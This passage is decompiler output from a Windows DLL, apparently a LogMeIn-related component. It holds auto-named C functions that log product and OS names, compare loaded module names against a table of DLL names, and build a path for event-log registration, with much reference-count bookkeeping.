      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_1003e406;
    }
    if (param_1 == (int *)0x0) goto LAB_1003e440;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004c430(param_2,param_3);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_100073c0(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined1 *)(param_1[2] + 0xc + (int)param_1) = 0;
    }
    return param_1;
  }
LAB_1003e406:
  iVar1 = FUN_1004c430(param_2,param_3);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_1003e4a0 */

void __thiscall FUN_1003e4a0(int param_1,undefined4 param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  undefined4 uVar6;
  undefined4 extraout_ECX;
  int *piVar7;
  int *local_74;
  int *local_70;
  int *local_6c;
  undefined4 local_68;
  int *local_64;
  int *local_60;
  int *local_5c;
  int *local_58;
  int *local_54;
  int local_50;
  int *local_4c;
  int *local_48;
  int *local_44;
  int *local_40;
  int *local_3c;
  int *local_38;
  int *local_34;
  int *local_30;
  int *local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  int *local_1c;
  undefined2 local_18;
  undefined2 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077698;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 4) == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = *(int *)(param_1 + 4) + 0xc;
  }
  local_50 = param_1;
  FUN_10010ef0(iVar2);
  local_8 = 1;
  piVar3 = (int *)FUN_10013e00(1,extraout_ECX);
  local_64 = piVar3;
  if ((local_38 != (int *)0x0) && (local_38 != (int *)0xfffffff4)) {
    FUN_10013f90(&local_64,0,uVar1);
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar3;
    *piVar3 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  local_2c = (int *)0x0;
  local_8._0_1_ = 2;
  FUN_100110e0(&local_2c);
  piVar3 = local_2c;
  local_3c = local_2c;
  if (local_2c == (int *)0x0) {
    piVar5 = (int *)0x0;
  }
  else {
    piVar5 = local_2c + 3;
  }
  FUN_10006250("sProdname: \'%s\'\n",piVar5);
  local_30 = (int *)0x0;
  local_8._0_1_ = 3;
  FUN_100110e0(&local_30);
  piVar5 = local_30;
  local_4c = local_30;
  if (local_30 == (int *)0x0) {
    piVar4 = (int *)0x0;
  }
  else {
    piVar4 = local_30 + 3;
  }
  FUN_10006250("sOsname: \'%s\'\n",piVar4);
  local_34 = (int *)0x0;
  local_8._0_1_ = 4;
  FUN_100110e0(&local_34);
  piVar4 = local_34;
  local_28 = local_34;
  if (local_34 == (int *)0x0) {
    piVar7 = (int *)0x0;
  }
  else {
    piVar7 = local_34 + 3;
  }
  FUN_10006250("sProdver: \'%s\'\n",piVar7);
  local_1c = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,5);
  FUN_100110e0(&local_1c);
  local_20 = local_1c;
  if (local_1c == (int *)0x0) goto LAB_1003ec97;
  if ((local_1c != (int *)0xfffffff4) && (local_60 = (int *)local_1c[2], local_60 != (int *)0x0)) {
    piVar3 = (int *)FUN_100074a0(0,1);
    local_5c = piVar3;
    local_1c = piVar3;
    if (piVar3 == (int *)0x0) {
      if (local_20 != (int *)0x0) {
        LOCK();
        iVar2 = *local_20;
        *local_20 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_20);
        }
      }
      piVar5 = (int *)0x0;
    }
    else {
      piVar5 = piVar3 + 3;
    }
    piVar4 = local_60;
    local_58 = piVar5;
    if (local_60 != (int *)0x0) {
      piVar7 = (int *)0x0;
      do {
        iVar2 = _tolower((int)*(char *)((int)piVar7 + (int)piVar5));
        *(char *)((int)piVar7 + (int)piVar5) = (char)iVar2;
        piVar7 = (int *)((int)piVar7 + 1);
        piVar3 = local_5c;
      } while (piVar7 < piVar4);
    }
    if (piVar3 != (int *)0x0) {
      if (piVar4 == (int *)0xffffffff) {
        piVar5 = piVar3 + 3;
        if (piVar5 == (int *)0x0) {
          piVar4 = (int *)0x0;
        }
        else {
          do {
            iVar2 = *piVar5;
            piVar5 = (int *)((int)piVar5 + 1);
          } while ((char)iVar2 != '\0');
          piVar4 = (int *)((int)piVar5 - ((int)piVar3 + 0xd));
        }
      }
      else if ((int *)(piVar3[1] + -1) <= piVar4) {
        piVar4 = (int *)(piVar3[1] + -1);
      }
      piVar3[2] = (int)piVar4;
      *(undefined1 *)((int)(piVar4 + 3) + (int)piVar3) = 0;
    }
    local_68 = 0;
    local_8 = CONCAT31(local_8._1_3_,6);
    do {
      if ((piVar3 == (int *)0x0) || (piVar3 == (int *)0xfffffff4)) break;
      iVar2 = FUN_10013f90(&local_68,1);
      piVar3 = local_1c;
    } while (iVar2 != 0);
    local_40 = (int *)0x0;
    local_8._0_1_ = 7;
    FUN_100110e0(&local_40);
    local_44 = (int *)0x0;
    local_8._0_1_ = 8;
    FUN_100110e0(&local_44);
    if (piVar3 != (int *)0x0) {
      LOCK();
      *piVar3 = *piVar3 + 1;
      UNLOCK();
    }
    local_8 = CONCAT31(local_8._1_3_,9);
    local_48 = piVar3;
    FUN_1003ed10(&local_48,param_2);
    if (piVar3 == (int *)0x0) {
LAB_1003e7a8:
      local_1c = (int *)0x0;
    }
    else {
      if (*piVar3 != 0) {
        LOCK();
        iVar2 = *local_1c;
        *local_1c = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_1c);
        }
        local_4c = local_30;
        local_28 = local_34;
        local_3c = local_2c;
        goto LAB_1003e7a8;
      }
      local_4c = local_30;
      local_1c[2] = 0;
      *(undefined1 *)(local_1c + 3) = 0;
      local_3c = local_2c;
      local_28 = local_34;
    }
    local_58 = local_40;
    if ((local_40 != (int *)0x0) && (local_40[2] != 0)) {
      local_20 = local_1c;
      local_1c = (int *)FUN_10007b60(local_40 + 3,local_40[2]);
    }
    local_54 = local_44;
    if ((local_44 != (int *)0x0) && (local_44[2] != 0)) {
      local_20 = local_1c;
      local_1c = (int *)FUN_10007b60(local_44 + 3,local_44[2]);
    }
    local_5c = local_48;
    piVar5 = local_1c;
    local_20 = local_1c;
    if ((local_48 != (int *)0x0) && (local_20 = local_1c, local_48[2] != 0)) {
      local_20 = local_1c;
      piVar5 = (int *)FUN_10007b60(local_48 + 3,local_48[2]);
      local_20 = piVar5;
      local_1c = piVar5;
    }
    do {
      if ((DAT_1009ac98 & 1) == 0) {
        DAT_1009ac98 = DAT_1009ac98 | 1;
        DAT_1009ac94 = (int *)FUN_100581b4(0x1f);
        if (DAT_1009ac94 != (int *)0x0) {
          DAT_1009ac94[1] = 0x10;
          DAT_1009ac94[2] = 2;
          *DAT_1009ac94 = 0;
          *(undefined2 *)(DAT_1009ac94 + 3) = 0;
          *(undefined1 *)(DAT_1009ac94[2] + 0xc + (int)DAT_1009ac94) = 0;
          DAT_1009ac94[2] = 0;
          *(undefined1 *)(DAT_1009ac94 + 3) = 0;
        }
        FUN_10057b51(&LAB_10078240);
      }
      if (DAT_1009ac94 != (int *)0x0) {
        LOCK();
        *DAT_1009ac94 = *DAT_1009ac94 + 1;
        UNLOCK();
      }
      piVar3 = DAT_1009ac94;
      local_6c = DAT_1009ac94;
      local_8 = CONCAT31(local_8._1_3_,0xb);
      if ((piVar5 == (int *)0x0) || (piVar5 == (int *)0xfffffff4)) {
        local_20 = (int *)0x0;
      }
      else {
        local_20 = (int *)FUN_10013f90(&local_6c,1);
        piVar5 = local_1c;
      }
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar3;
        *piVar3 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      piVar4 = piVar5;
    } while (local_20 != (int *)0x0);
    do {
      local_20 = piVar4;
      if ((DAT_1009ac98 & 1) == 0) {
        DAT_1009ac98 = DAT_1009ac98 | 1;
        local_14 = 0;
        DAT_1009ac94 = (int *)FUN_100581b4(0x1f);
        if (DAT_1009ac94 != (int *)0x0) {
          DAT_1009ac94[1] = 0x10;
          DAT_1009ac94[2] = 2;
          *DAT_1009ac94 = 0;
          *(undefined2 *)(DAT_1009ac94 + 3) = local_14;
          *(undefined1 *)((int)DAT_1009ac94 + DAT_1009ac94[2] + 0xc) = 0;
          DAT_1009ac94[2] = 0;
          *(undefined1 *)(DAT_1009ac94 + 3) = 0;
        }
        FUN_10057b51(&LAB_10078240);
      }
      if (DAT_1009ac94 != (int *)0x0) {
        LOCK();
        *DAT_1009ac94 = *DAT_1009ac94 + 1;
        UNLOCK();
      }
      piVar3 = DAT_1009ac94;
      local_70 = DAT_1009ac94;
      local_8 = CONCAT31(local_8._1_3_,0xc);
      if ((piVar5 == (int *)0x0) || (piVar5 == (int *)0xfffffff4)) {
        local_20 = (int *)0x0;
      }
      else {
        local_20 = (int *)FUN_10013f90(&local_70,1);
        piVar5 = local_1c;
      }
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar3;
        *piVar3 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      piVar3 = local_3c;
      piVar7 = piVar5;
      piVar4 = local_20;
    } while (local_20 != (int *)0x0);
    do {
      local_20 = piVar7;
      if ((DAT_1009ac98 & 1) == 0) {
        DAT_1009ac98 = DAT_1009ac98 | 1;
        local_18 = 0;
        DAT_1009ac94 = (int *)FUN_100581b4(0x1f);
        if (DAT_1009ac94 != (int *)0x0) {
          DAT_1009ac94[1] = 0x10;
          DAT_1009ac94[2] = 2;
          *DAT_1009ac94 = 0;
          *(undefined2 *)(DAT_1009ac94 + 3) = local_18;
          *(undefined1 *)((int)DAT_1009ac94 + DAT_1009ac94[2] + 0xc) = 0;
          DAT_1009ac94[2] = 0;
          *(undefined1 *)(DAT_1009ac94 + 3) = 0;
        }
        FUN_10057b51(&LAB_10078240);
      }
      if (DAT_1009ac94 != (int *)0x0) {
        LOCK();
        *DAT_1009ac94 = *DAT_1009ac94 + 1;
        UNLOCK();
      }
      piVar4 = DAT_1009ac94;
      local_74 = DAT_1009ac94;
      local_8 = CONCAT31(local_8._1_3_,0xd);
      if ((piVar5 == (int *)0x0) || (piVar5 == (int *)0xfffffff4)) {
        local_3c = (int *)0x0;
      }
      else {
        local_3c = (int *)FUN_10013f90(&local_74,1);
        piVar5 = local_1c;
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar4;
        *piVar4 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      piVar4 = local_5c;
      piVar7 = local_20;
    } while (local_3c != (int *)0x0);
    local_24 = (int *)0x0;
    local_8 = CONCAT31(local_8._1_3_,0xe);
    local_20 = piVar5;
    if ((piVar3 != (int *)0x0) && (piVar3[2] != 0)) {
      local_24 = (int *)FUN_10007b60(piVar3 + 3,piVar3[2]);
    }
    piVar5 = local_4c;
    if ((local_4c != (int *)0x0) && (local_4c[2] != 0)) {
      local_24 = (int *)FUN_10007b60(local_4c + 3,local_4c[2]);
    }
    if ((local_28 != (int *)0x0) && (local_28[2] != 0)) {
      local_24 = (int *)FUN_10007b60(local_28 + 3,local_28[2]);
    }
    if ((local_20 != (int *)0x0) && (local_20[2] != 0)) {
      local_24 = (int *)FUN_10007b60(local_20 + 3,local_20[2]);
    }
    if ((piVar4 == (int *)0x0) || (piVar4[2] == 0)) {
      piVar7 = *(int **)(local_50 + 0xc);
      local_5c = piVar7;
      if (piVar7 == (int *)0x0) {
LAB_1003ec15:
        piVar7 = (int *)0x0;
      }
      else {
        if (*piVar7 != 0) {
          LOCK();
          iVar2 = *piVar7;
          *piVar7 = iVar2 + -1;
          UNLOCK();
          if (iVar2 + -1 < 0) {
            FUN_100579ee(piVar7);
          }
          local_28 = local_34;
          local_58 = local_40;
          local_54 = local_44;
          local_20 = local_1c;
          piVar4 = local_48;
          piVar5 = local_30;
          piVar3 = local_2c;
          goto LAB_1003ec15;
        }
        piVar7[2] = 0;
        *(undefined1 *)(piVar7 + 3) = 0;
        local_20 = local_1c;
        local_28 = local_34;
        local_54 = local_44;
        local_58 = local_40;
        piVar4 = local_48;
        piVar5 = local_30;
        piVar3 = local_2c;
      }
      *(int **)(local_50 + 0xc) = piVar7;
    }
    else {
      FUN_1003e2c0(&local_24);
      uVar6 = FUN_10007010(local_60);
      *(undefined4 *)(local_50 + 0xc) = uVar6;
      if (local_60 != (int *)0x0) {
        LOCK();
        iVar2 = *local_60;
        *local_60 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_60);
        }
      }
    }
    if (local_24 != (int *)0x0) {
      LOCK();
      iVar2 = *local_24;
      *local_24 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_24);
      }
    }
    if (piVar4 != (int *)0x0) {
      LOCK();
      iVar2 = *piVar4;
      *piVar4 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar4);
      }
    }
    if (local_54 != (int *)0x0) {
      LOCK();
      iVar2 = *local_54;
      *local_54 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_54);
      }
    }
    piVar4 = local_28;
    if (local_58 != (int *)0x0) {
      LOCK();
      iVar2 = *local_58;
      *local_58 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_58);
        piVar4 = local_28;
      }
    }
  }
  if (local_20 != (int *)0x0) {
    LOCK();
    iVar2 = *local_20;
    *local_20 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(local_20);
    }
  }
LAB_1003ec97:
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar4;
    *piVar4 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar5;
    *piVar5 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar3;
    *piVar3 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  if (local_38 != (int *)0x0) {
    LOCK();
    iVar2 = *local_38;
    *local_38 = *local_38 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(local_38);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1003ed10 */

void FUN_1003ed10(undefined4 *param_1,int param_2)

{
  char *pcVar1;
  char cVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  uint uVar6;
  char *pcVar7;
  int iVar8;
  undefined4 uVar9;
  int *piVar10;
  int iVar11;
  uint uVar12;
  int *local_20;
  int local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100776d8;
  local_10 = ExceptionList;
  uVar6 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_14 = (int *)0x0;
  local_8 = 0;
  FUN_100110e0(&local_14,uVar6);
  local_1c = 0;
  local_20 = (int *)FUN_1000fa00(0,0);
  local_8 = CONCAT31(local_8._1_3_,1);
  FUN_10011340(&local_20);
  piVar10 = (int *)*local_20;
  if (piVar10 != local_20) {
    do {
      local_18 = (int *)0x0;
      local_8 = CONCAT31(local_8._1_3_,2);
      FUN_100110e0(&local_18,uVar6);
      piVar5 = local_18;
      uVar12 = 0;
      do {
        pcVar7 = *(char **)((int)&PTR_s_avutil_51_dll_10084d70 + uVar12);
        if (pcVar7 == (char *)0x0) {
          iVar8 = 0;
        }
        else {
          pcVar1 = pcVar7 + 1;
          do {
            cVar2 = *pcVar7;
            pcVar7 = pcVar7 + 1;
          } while (cVar2 != '\0');
          iVar8 = (int)pcVar7 - (int)pcVar1;
        }
        if (piVar5 == (int *)0x0) {
          iVar11 = 0;
        }
        else {
          iVar11 = piVar5[2];
        }
        if ((iVar11 == iVar8) &&
           (iVar8 = FUN_1004a6e0(*(undefined4 *)((int)&PTR_s_avutil_51_dll_10084d70 + uVar12),iVar11
                                ), iVar8 == 0)) {
          param_2 = 1;
          break;
        }
        uVar12 = uVar12 + 4;
      } while (uVar12 < 0x244);
      piVar3 = (int *)*piVar10;
      if (param_2 == 0) {
        local_1c = local_1c + -1;
        *(int *)piVar10[1] = *piVar10;
        *(int *)(*piVar10 + 4) = piVar10[1];
        piVar4 = (int *)piVar10[2];
        if (piVar4 != (int *)0x0) {
          LOCK();
          iVar8 = *piVar4;
          *piVar4 = iVar8 + -1;
          UNLOCK();
          if (iVar8 + -1 < 0) {
            FUN_100579ee(piVar4);
          }
        }
        thunk_FUN_100579ee(piVar10);
      }
      local_8 = CONCAT31(local_8._1_3_,1);
      if (piVar5 != (int *)0x0) {
        LOCK();
        iVar8 = *piVar5;
        *piVar5 = iVar8 + -1;
        UNLOCK();
        if (iVar8 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
      }
      piVar10 = piVar3;
    } while (piVar3 != local_20);
  }
  piVar10 = (int *)*param_1;
  if (piVar10 != (int *)0x0) {
    if (*piVar10 == 0) {
      piVar10[2] = 0;
      *(undefined1 *)(piVar10 + 3) = 0;
      goto LAB_1003eeb6;
    }
    LOCK();
    iVar8 = *piVar10;
    *piVar10 = iVar8 + -1;
    UNLOCK();
    if (iVar8 + -1 < 0) {
      FUN_100579ee(piVar10);
    }
  }
  piVar10 = (int *)0x0;
LAB_1003eeb6:
  piVar5 = local_20;
  *param_1 = piVar10;
  for (piVar10 = (int *)*local_20; piVar10 != piVar5; piVar10 = (int *)*piVar10) {
    iVar8 = piVar10[2];
    if ((iVar8 != 0) && (*(int *)(iVar8 + 8) != 0)) {
      uVar9 = FUN_10007b60(iVar8 + 0xc,*(undefined4 *)(iVar8 + 8));
      *param_1 = uVar9;
    }
  }
  piVar10 = (int *)*piVar5;
  *piVar5 = (int)piVar5;
  piVar5[1] = (int)piVar5;
  while (piVar10 != piVar5) {
    piVar3 = (int *)piVar10[2];
    piVar4 = (int *)*piVar10;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar8 = *piVar3;
      *piVar3 = iVar8 + -1;
      UNLOCK();
      if (iVar8 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    thunk_FUN_100579ee(piVar10);
    piVar10 = piVar4;
  }
  thunk_FUN_100579ee(piVar5);
  if (local_14 != (int *)0x0) {
    LOCK();
    iVar8 = *local_14;
    *local_14 = *local_14 + -1;
    UNLOCK();
    if (iVar8 + -1 < 0) {
      FUN_100579ee(local_14);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1003ef60 */

undefined4 * FUN_1003ef60(short *param_1)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077710;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  DAT_1009b628 = 0;
  if ((param_1 == (short *)0x0) || (*param_1 != 0)) {
    piVar3 = (int *)FUN_1000bd10(uVar2);
  }
  else {
    piVar3 = (int *)FUN_1000ba60();
  }
  local_8 = 0;
  piVar4 = (int *)FUN_1000bd10(uVar2);
  local_8 = CONCAT31(local_8._1_3_,1);
  FUN_1003f130();
  FUN_1003f630();
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  if (DAT_10099134 != (code *)0x0) {
    if (piVar3 == (int *)0x0) {
      piVar5 = (int *)0x0;
    }
    else {
      piVar5 = piVar3 + 3;
    }
    DAT_1009b628 = (*DAT_10099134)(0,piVar5);
  }
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  ExceptionList = local_10;
  return &DAT_1009b628;
}



/* Function: FUN_1003f070 */

void __fastcall FUN_1003f070(int *param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  undefined4 local_14;
  undefined4 local_10;
  
  if (((*param_1 != 0) && (*(int *)(*param_1 + 8) != 0)) &&
     ((*param_2 == 0 || (*(int *)(*param_2 + 8) == 0)))) {
    FUN_100213b0(param_1);
    if (local_14 != 0 || local_10 != 0) {
      iVar2 = FUN_10010440(*param_1);
      *param_2 = iVar2;
      piVar1 = (int *)*param_1;
      if (piVar1 != (int *)0x0) {
        LOCK();
        *piVar1 = *piVar1 + 1;
        UNLOCK();
      }
      uVar3 = FUN_10027850();
      iVar2 = FUN_1000bdd0(uVar3,extraout_ECX);
      *param_1 = iVar2;
      if (piVar1 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar1;
        *piVar1 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar1);
        }
      }
      FUN_100579df();
      return;
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_1003f130 */

void __fastcall FUN_1003f130(int *param_1,int *param_2)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  int *piVar5;
  int iVar6;
  undefined **ppuVar7;
  undefined4 uVar8;
  int *piVar9;
  uint uVar10;
  int *extraout_ECX;
  int *piVar11;
  undefined1 auStack_7c [4];
  int *local_78;
  char local_71;
  int *local_70;
  int *local_6c;
  int *local_68;
  int *local_64;
  uint local_60;
  int *local_5c;
  int *local_58;
  int *local_54;
  int local_28;
  int local_24;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10077758;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_7c;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xffffff78;
  ExceptionList = &local_14;
  iVar6 = *param_2;
  local_60 = 0;
  local_78 = param_2;
  local_70 = param_1;
  if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
    uVar3 = 0;
    if (iVar6 == 0) {
      uVar10 = 0;
    }
    else {
      uVar10 = *(uint *)(iVar6 + 8);
      if (uVar10 != 0) {
        do {
          if (*(short *)(iVar6 + 0xc + uVar3 * 2) == 0x5c) break;
          uVar3 = uVar3 + 1;
        } while (uVar3 < uVar10);
      }
    }
    if (uVar10 <= uVar3) {
      uVar3 = 0xffffffff;
    }
    if (uVar3 != 0xffffffff) goto LAB_1003f580;
  }
  puVar4 = (undefined4 *)FUN_10021a40(0,1);
  piVar9 = (int *)*puVar4;
  if (piVar9 != (int *)0x0) {
    LOCK();
    *piVar9 = *piVar9 + 1;
    UNLOCK();
  }
  local_c = 0;
  local_54 = piVar9;
  if (local_68 != (int *)0x0) {
    LOCK();
    iVar6 = *local_68;
    *local_68 = iVar6 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(local_68);
    }
  }
  if (piVar9 != (int *)0x0) {
    LOCK();
    *piVar9 = *piVar9 + 1;
    UNLOCK();
  }
  local_64 = piVar9;
  FUN_1000c820(1);
  FUN_10019e10(&local_58);
  local_c = CONCAT31(local_c._1_3_,2);
  piVar5 = (int *)FUN_1000ae10(&local_68);
  if (*piVar5 == 0) {
    iVar6 = 0;
  }
  else {
    iVar6 = *piVar5 + 0xc;
  }
  FUN_10006250("dll-path for the evt-log registration: \'%s\'\n",iVar6);
  if (local_68 != (int *)0x0) {
    LOCK();
    iVar6 = *local_68;
    *local_68 = iVar6 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(local_68);
    }
  }
  if (local_58 != (int *)0x0) {
    LOCK();
    iVar6 = *local_58;
    *local_58 = iVar6 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(local_58);
    }
  }
  piVar5 = local_64;
  if (((local_64 == (int *)0x0) || (local_64 + 3 == (int *)0x0)) || ((short)local_64[3] != 0)) {
    local_68 = (int *)FUN_1000bd10();
  }
  else {
    local_68 = (int *)FUN_1000ba60();
  }
  local_c = CONCAT31(local_c._1_3_,3);
  iVar6 = *local_78;
  if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
    local_68 = (int *)FUN_1000bfa0(iVar6 + 0xc,*(undefined4 *)(iVar6 + 8));
  }
  piVar1 = local_68;
  iVar6 = FUN_10010440(local_68);
  *local_78 = iVar6;
  if (((*local_70 == 0) || (*(int *)(*local_70 + 8) == 0)) ||
     (FUN_100213b0(local_78), local_28 == 0 && local_24 == 0)) {
    uVar3 = local_60;
    if ((*local_70 == 0) || (*(int *)(*local_70 + 8) == 0)) {
LAB_1003f39d:
      local_71 = '\0';
    }
    else {
      local_58 = (int *)FUN_10019e10(&local_6c);
      piVar5 = (int *)FUN_10019e10(&local_5c);
      uVar3 = 3;
      iVar6 = *local_58;
      if ((iVar6 == 0) || (*(int *)(iVar6 + 8) == 0)) {
        ppuVar7 = &PTR_10083554;
      }
      else if (iVar6 == 0) {
        ppuVar7 = (undefined **)0x0;
      }
      else {
        ppuVar7 = (undefined **)(iVar6 + 0xc);
      }
      if (*piVar5 == 0) {
        iVar6 = 0;
      }
      else {
        iVar6 = *(int *)(*piVar5 + 8);
      }
      piVar5 = local_64;
      if (*(short *)((int)ppuVar7 + iVar6 * 2 + -2) == 0x5c) goto LAB_1003f39d;
      local_71 = '\x01';
    }
    if (((uVar3 & 2) != 0) &&
       (local_60 = uVar3 & 0xfffffffd, uVar3 = local_60, local_5c != (int *)0x0)) {
      LOCK();
      iVar6 = *local_5c;
      *local_5c = iVar6 + -1;
      UNLOCK();
      if (iVar6 + -1 < 0) {
        FUN_100579ee(local_5c);
        uVar3 = local_60;
      }
    }
    if (((uVar3 & 1) != 0) && (local_6c != (int *)0x0)) {
      LOCK();
      iVar6 = *local_6c;
      *local_6c = iVar6 + -1;
      UNLOCK();
      if (iVar6 + -1 < 0) {
        FUN_100579ee(local_6c);
      }
    }
    if (local_71 == '\0') {
      iVar6 = FUN_1000bfa0(L"LMIGuardianDll",0xffffffff);
      *local_78 = iVar6;
      iVar6 = FUN_1000bfa0(L".dll",0xffffffff);
      *local_78 = iVar6;
      uVar8 = FUN_1000ae10(&local_6c);
      local_c = CONCAT31(local_c._1_3_,4);
      FUN_10026a20(uVar8);
      piVar11 = local_6c;
      if (local_6c != (int *)0x0) {
        LOCK();
        iVar6 = *local_6c;
        *local_6c = iVar6 + -1;
        UNLOCK();
        if (iVar6 + -1 < 0) {
          FUN_100579ee(local_6c);
          piVar11 = extraout_ECX;
        }
      }
      iVar6 = FUN_1000bdd0(L"LMIGuardianDll",piVar11);
      *local_70 = iVar6;
    }
    else {
      iVar6 = *local_70;
      if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
        iVar6 = FUN_1000bfa0(iVar6 + 0xc,*(undefined4 *)(iVar6 + 8));
        *local_78 = iVar6;
      }
      iVar6 = FUN_1000ad70(L".dll",0xffffffff,0);
      if (iVar6 == -1) {
        iVar6 = FUN_1000bfa0(L".dll",0xffffffff);
        *local_78 = iVar6;
        FUN_1003f070();
      }
      else {
        uVar8 = FUN_1000ad70(L".dll",0xffffffff,0);
        puVar4 = (undefined4 *)FUN_1003f9c0(&local_6c,uVar8);
        iVar6 = FUN_10010440(*puVar4);
        *local_70 = iVar6;
        if (local_6c != (int *)0x0) {
          LOCK();
          iVar6 = *local_6c;
          *local_6c = iVar6 + -1;
          UNLOCK();
          if (iVar6 + -1 < 0) {
            FUN_100579ee(local_6c);
          }
        }
        FUN_1003f070();
      }
    }
  }
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar6 = *piVar1;
    *piVar1 = iVar6 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar6 = *piVar5;
    *piVar5 = iVar6 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  local_c = 0xffffffff;
  if (piVar9 != (int *)0x0) {
    LOCK();
    iVar6 = *piVar9;
    *piVar9 = iVar6 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(piVar9);
    }
  }
LAB_1003f580:
  FUN_100213b0(local_78);
  if (local_28 == 0 && local_24 == 0) {
    piVar9 = (int *)FUN_1000ae10(&local_6c);
    if (*piVar9 == 0) {
      FUN_10006250("missing dll name: \'%s\'\n",0,uVar2);
    }
